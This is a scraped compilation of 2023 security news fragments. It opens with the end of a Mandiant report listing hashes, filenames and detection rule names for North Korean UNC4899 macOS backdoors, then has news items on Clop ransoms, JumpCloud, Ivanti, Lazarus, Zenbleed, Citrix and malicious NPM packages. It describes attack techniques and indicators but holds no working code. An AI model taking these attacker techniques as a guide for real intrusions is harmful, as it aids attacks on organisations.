ARM64)6d8194c003d0025fa92fbcbf2eadb6d1a90561efc22bdd777956cc67d5b67e3ec3c1b4f35a64f4328e40615d2ab24186us.zoom.ZoomServiceSTRATOFEAR backdoor (Mach-O ARM64)48eaf2a7e97189709fb3789f0c662e1c5d18443f88f38ad7e3de62ac46489f649b4e8183b76fba902fb9a9ccf8a0d5c8com.apple.privacyTIEDYE encrypted configurationb0e0e0d258fcd55d3cc5af2b4669e0149b1c1013ad8d2c0144af74eff5a2afc454b7b858bb7a5cba312bfb0f531c8930com.xpc.agent.plistTIEDYE LaunchDaemon15bfe67e912f224faef9c7f6968279c66f1c47566a46d252885858f928a3b855fb3fd03941e3571d152562d0c75c4d47xpc.protectTIEDYE backdoor (Mach-O ARM64)N/Af0854a28209e07a70d7847af4b2632e697bcb95f2c8fcead41eb9314710bd0c2xpc.protectTIEDYE backdoor (Mach-O ARM64)Filenameexec_signing_idexec_cdhashus.zoom.ZoomUpdatemac-555549440ea0d64e96bb34428e08cc8d948b40e7e5d42bee74a1e1813e8aad9a46a5ebc219953926npx-climac-555549440ea0d64e96bb34428e08cc8d948b40e7e5d42bee74a1e1813e8aad9a46a5ebc219953926com.docker.vmnatmac-555549440ea0d64e96bb34428e08cc8d948b40e7e5d42bee74a1e1813e8aad9a46a5ebc219953926com.google.kservicep-macos-55554944c2a6eb29a7bc3c73acdaa3e0a7a8d8c7ff975b95cfc65b6d19ca18993322cfeed282de04xpc.protectsecurityd-555549440fca1d2f1e613094b0c768d393f83d7fc1fc3213bdb8f3139fd5d4b13e242441016c3c84VIDNameA106-587Command and Control - UNC4899, DNS Query, Variant #2A106-588Command and Control - UNC4899, DNS Query, Variant #1A106-589Command and Control - UNC4899, STRATOFEAR, DNS Query, Variant #1A106-590Command and Control - UNC4899, TIEDYE, DNS Query, Variant #1A106-591Command and Control - UNC4899, TIEDYE, DNS Query, Variant #2A106-592Command and Control - UNC4899, STRATOFEAR, DNS Query, Variant #2A106-593Malicious File Transfer - UNC4899, TIEDYE, Download, Variant #1A106-594Malicious File Transfer - UNC4899, STRATOFEAR, Download, Variant #1 Get the Google Cloud Cyberseurity Forecast 2024 report to explore the latest trends on the horizon.Mandiant experts are ready to answer your questions.© Copyright 2023 Mandiant.

      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe security vendor claimed in a new report that the Russian cybercrime group “dramatically increased” its average ransom demand during the campaign.“While the MOVEit campaign may end up impacting over 1000 companies directly, and an order of magnitude more indirectly, a very, very small percentage of victims bothered trying to negotiate, let alone contemplated paying,” the report noted.“Those that did pay, paid substantially more than prior Clop campaigns, and several times more than the global average ransom amount of $740,144 (+126% from Q1 2023).”Coveware estimates the total haul for Clop at $75–100m, with that amount coming “from just a small handful of victims that succumbed to very high ransom payments.”“This is a dangerous and staggering sum of money for one, relatively small group to possess. For context, this amount is larger than the annual offensive security budget of Canada,” Coveware added.Clop famously exploited a zero-day vulnerability in the MOVEit file transfer software to steal data from countless corporate users of the tool. This tactic could be seen as a response to the fact that traditional ransomware attacks are getting harder to monetize, according to Coveware.In fact, the percentage of attacks that resulted in the victim paying, fell to a record low of 34% in the second quarter, it said.Threat groups are targeting larger victim organizations again in order to secure a bigger payout, and there’s been a “dramatic reduction” in encryption attacks from RaaS groups targeting small enterprises.“Second, it was observed that the more technically sophisticated affiliates that previously used both Dharma and/or Phobos have begun using a new ransomware kit called 8base.”"

      "text": " A hacking unit of North Korea's Reconnaissance General Bureau (RGB) was linked to the JumpCloud breach after the attackers made an operational security (OPSEC) mistake, inadvertently exposing their real-world IP addresses.The hacking group, tracked as UNC4899 by Mandiant, was previously observed using a combination of commercial VPNs and Operational Relay Boxes (ORBs) using L2TP IPsec tunnels to hide their actual location.Mandiant says UNC4899 threat actors have used many VPN providers for this purpose in previous campaigns, including ExpressVPN, NordVPN, TorGuard, and others. While North Korean state hackers are known for using commercial VPN services to mask their IP addresses and actual locations, during the JumpCloud attack, the VPNs they were using failed and exposed their location in Pyongyang while connecting to a victim's network.\"Additionally we observed the DPRK threat actor log directly into a Pyongyang IP, from one of their jump boxes. Our evidence supports that this was an OPSEC slip up since the connection to the North Korean netblock was short-lived.\"Apart from this OPSEC oversight, Mandiant security researchers also found attack infrastructure overlapping with previously associated hacks linked to North Korean hackers, further bolstering the attribution of the breach to North Korean hackers.\"We assess with high confidence that UNC4899 is a cryptocurrency-focused group that falls under the RGB. UNC4899's targeting is selective, and they have been observed gaining access to victim networks through JumpCloud,\" Mandiant added.\"Mandiant has observed UNC2970, APT43, and UNC4899 all utilize similar infrastructure.\"Senior Incident Response Consultant Austin Larsen told BleepingComputer that the attackers also hit a downstream victim following their breach of JumpCloud.Mandiant foresees that additional victims may be currently dealing with the repercussions of this attack.While the company has now attributed the attack, it has not yet disclosed the number of impacted customers.Colorado-based JumpCloud is an operational directory-as-a-service platform that offers single sign-on and multi-factor authentication services to a vast network of over 180,000 organizations spanning more than 160 countries."

Older versions/releases are also at risk. An unauthorized, remote (internet-facing) actor can access users' personally identifiable information and can allow limited changes to the server.\"After news of the vulnerability circulated among the cybersecurity community, security expert Kevin Beaumont warned that admins should apply the patches as soon as possible due to the ease of exploitation.While the company has not publicly admitted that the zero-day was actively exploited, the private bulletin says that a \"trusted source\" informed Ivanti that CVE-2023-35078 was exploited in attacks against a limited number of customers.\"We have received information from a credible source indicating exploitation against a very small number of customers (e.g., less than 10). We do not have more information the share at this time,\" the private advisory reads.Ivanti added that the bug is not being exploited as part of a supply chain attack, saying that it didn't find \"any indication that this vulnerability was introduced into our code development process maliciously.\"\"Ivanti became aware and addressed a vulnerability that impacts Ivanti Endpoint Manager Mobile (formerly MobileIron Core) customers,\" an Ivanti spokesperson BleepingComputer, after a second inquiry asking to confirm exploitation in attacks and if the company will release a public advisory.\"We immediately developed and released a patch and are actively engaging with customers to help them apply the fix.\"Most of the exposed servers are located in the United States, followed by Germany, the United Kingdom, and Hong Kong.It is strongly advised that all network admins apply the Ivanti Endpoint Manager Mobile (MobileIron) patches as soon as possible."

The HTM file is copied to a DLL file called scskapplink.dll and injected into the legitimate system management software INISAFE Web EX Client,\" explains the 2022 report by Symantec.Exploiting the flaw fetches a malicious 'SCSKAppLink.dll' payload from an IIS web server already compromised before the attack for use as a malware distribution server.\"The download URL for 'SCSKAppLink.dll' was identified as being the aforementioned IIS web server,\" explains ASEC's new report.\"This signifies that the threat actor attacked and gained control over IIS web servers before using these as servers for distributing malware.\"ASEC did not analyze the particular payload but says it is likely a malware downloader seen in other recent Lazarus campaigns.Next, Lazarus uses the 'JuicyPotato' privilege escalation malware ('usopriv.exe') to gain higher-level access to the compromised system.JuicyPotato is used for executing a second malware loader ('usoshared.dat') that decrypts downloaded data files and executes them into memory for AV evasion.ASEC recommends that NISAFE CrossWeb EX V6 users update the software to its latest version, as Lazarus' exploitation of known vulnerabilities in the product has been underway since at least April 2022.Microsoft application servers are becoming a popular target for hackers to use in malware distribution, likely due to their trusted nature."

      "text": " Google's security researcher Tavis Ormandy discovered a new vulnerability impacting AMD Zen2 CPUs that could allow a malicious actor to steal sensitive data, such as passwords and encryption keys, at a rate of 30KB/sec from each CPU core.The vulnerability is tracked as CVE-2023-20593 and is caused by the improper handling of an instruction called 'vzeroupper' during speculative execution, a common performance-enhancing technique used in all modern processors.Ormandy used fuzzing and performance counters to discover specific hardware events and validated his results using an approach called \"Oracle Serialization.\"With this approach, the author was able to detect inconsistencies between the execution of the randomly generated program and its serialized oracle, leading to the discovery of CVE-2023-20593 in Zen2 CPUs.After triggering an optimized exploit for the flaw, the researcher could leak sensitive data from any system operation, including those that take place in virtual machines, isolated sandboxes, containers, etc.The researcher reported the flaw to AMD on May 15, 2023, and today, he published a proof-of-concept (PoC) exploit for CVE-2023-20593.The exploit is written for Linux, but the bug is OS-agnostic, so all operating systems running on Zen 2 CPUs are affected.The flaw impacts all AMD CPUs built on the Zen 2 architecture, including the Ryzen 3000 (\"Matisse\"), Ryzen 4000U/H (\"Renoir\"), Ryzen 5000U (\"Lucienne\"), Ryzen 7020, and the high-end ThreadRipper 3000 and Epyc server (\"Rome\") processors.Ormandy concludes that detecting exploitation of Zenbleed is most likely impossible, as improper usage of 'vzeroupper' does not require elevated privileges or special system calls and hence would be pretty stealthy.Zenbleed's practical impact on regular users is relatively low, as it requires local access to the target system and a high degree of specialization and knowledge to exploit.However, it's essential to keep systems up-to-date with the latest security patches and apply any BIOS updates as soon as they become available."

      "text": " UK / EMEA News Reporter, Infosecurity MagazineOver 15,000 Citrix servers worldwide are at risk of compromise unless administrators patch urgently, a leading security non-profit has warned.“It is thus safe to assume in our view that all instances that still provide version hashes have not been updated and thus, providing no mitigation is in place, remain vulnerable. In addition, we have also added tagged as vulnerable instances that return a ‘Last Modified’ headers with a date before July 1, 2023 00:00:00Z. Make sure to update.”It impacts NetScaler ADC (formerly Citrix ADC) and NetScaler Gateway (formerly Citrix Gateway) and emerged as a zero-day vulnerability in early July after being advertised online by a threat actor."

      "text": " Reporter, Infosecurity MagazineApplication security provider Checkmarx has identified what it described as the first open source software supply chain attacks targeting the banking sector.The first attack started in February 2023, when a threat actor uploaded a package to NPM, the world’s largest software registry.This package contained a payload designed to latch onto a specific login form element on the targeted bank’s web page, stealthily intercepting login data and then transmitting it to a remote location.  The premise of the second attack, observed from early April 2023, is similar, with a threat actor uploading packages to NPM.These packages contained a preinstall script that executed its malicious objective upon installation.First, the script identified the victim’s operating system (Windows, Linux, or Darwin/MacOS). Then, based on the result, the script decoded the relevant encrypted files in the NPM package.Next, the attacker used these files to download a malicious binary onto the victim’s system.To avoid detection and bypasses traditional deny list methods, the attacker created a subdomain that incorporated the name of the targeted bank on Microsoft Azure CDN.They also leveraged the Havoc Framework, an advanced post-exploitation command and control framework crafted by the self-proclaimed “malware writer” going by the Twitter handle @C5pider.“Havoc’s ability to evade standard defenses, like Windows Defender, makes it a go-to option for threat actors, replacing legitimate toolkits such as Cobalt Strike, Sliver, and Brute Ratel,” reads the report.Checkmarx also noted that the contributor behind these packages was linked to a LinkedIn profile page of an individual posing as an employee of the targeted bank.The security researchers commented: “Our initial assumption was that this may be a penetration testing exercise by the bank. However, the response we received upon contacting the institution for clarification painted a different picture — the bank wasn’t aware of this activity.”While the malicious open source packages have been reported by Checkmarx and removed, the firm predicts “a persistent trend of attacks against the banking sector’s software supply chain to continue.”The researchers argued that the sole vulnerability scanning at the build level is “no longer adequate in the face of today’s advanced cyber threats. Once a malicious open-source package enters the pipeline, it’s essentially an instantaneous breach — rendering any subsequent countermeasures ineffective. […] This escalating gap underscores the urgency to shift our strategy from merely managing malicious packages to proactively preventing their infiltration into our Software Development Lifecycle (SDLC) in the first place.”"

      "text": " Freelance JournalistNorway’s government has reported that twelve of its ministries have fallen victim to a cyber-attack. At a press conference earlier today, Erik Hope, the head of the government agency responsible for providing services to ministries, revealed that the cyber-attack was traced back to a vulnerability in one of the government’s suppliers. However, the minister reassured the public that the weakness had been addressed promptly. Hope also said the attack detection was made possible by monitoring unusual traffic on the supplier’s platform. Despite ongoing investigations by the police since the discovery on July 12, the minister did not divulge specific details about the incident. He emphasized that it was too early to ascertain the responsible party and the full extent of the attack’s impact.“Over the past 18 months, we’ve seen an increasing number of attacks directly targeting state infrastructure within countries broadly supportive of Ukraine.”At the same time, Hope clarified that some critical entities within the government, including the Prime Minister’s office, as well as the foreign, defense and justice ministries, were not affected. These ministries operate on a different IT platform, which acted as a protective measure.“This is yet another reminder of the urgency needed to assess and mitigate security vulnerabilities in suppliers, as this attack has been attributed to a weakness in an IT supplier,” Wilkes added."
